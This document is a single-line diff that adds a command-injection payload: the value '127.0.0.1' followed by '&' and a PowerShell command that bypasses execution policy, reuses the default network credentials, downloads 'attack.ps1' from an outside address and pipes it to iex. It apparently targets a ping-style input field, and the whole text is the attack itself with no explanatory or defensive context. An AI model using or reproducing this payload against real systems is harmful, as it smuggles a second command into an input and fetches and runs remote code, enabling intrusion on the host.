@@ -1,0 +1,1 @@
+127.0.0.1 & powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://192.168.243.156:8000/attack.ps1')|iex"
